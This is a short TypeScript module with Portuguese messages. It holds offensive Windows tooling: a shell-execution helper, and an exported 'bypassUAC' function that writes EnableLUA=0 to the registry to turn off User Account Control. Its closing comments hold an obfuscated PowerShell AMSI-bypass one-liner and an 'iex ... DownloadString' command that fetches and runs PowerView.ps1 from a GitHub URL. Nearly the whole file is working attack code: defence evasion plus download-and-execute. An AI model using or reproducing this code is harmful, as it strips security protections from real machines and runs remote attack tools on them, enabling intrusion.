import { exec } from 'child_process';
import regedit from 'regedit';
const executeCommand = (
  command: string,
  usePowerShell: boolean = false,
): Promise<string> => {
  return new Promise((resolve, reject) => {
    const shell = usePowerShell ? 'powershell.exe' : 'cmd.exe';
    const commandToRun = usePowerShell
      ? `-Command ${command}`
      : `/c ${command}`;

    exec(`${shell} ${commandToRun}`, (error, stdout, stderr) => {
      if (error) {
        reject(`Erro ao executar "${command}": ${error.message}`);
        return;
      }
      if (stderr) {
        reject(`Erro (stderr) ao executar "${command}": ${stderr}`);
        return;
      }
      resolve(stdout.trim());
    });
  });
};

const bypassUAC = async () => {
  // Editando uma chave de registro para alterar o comportamento do UAC

  regedit.createKey(
    'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
    function (err: any) {
      if (err) {
        console.log('Erro ao editar o registro:', err);
      } else {
        regedit.putValue(
          {
            'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System':
              {
                EnableLUA: {
                  value: 0,
                  type: 'REG_DWORD',
                },
              },
          },
          // @ts-ignore
          function (err) {
            if (err) console.log(err);
            else console.log('UAC desabilitado!');
          },
        );
      }
    },
  );
};

export default bypassUAC;

// S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f ('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

// iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/tristao-marinho/Tools/main/PowerView.ps1')
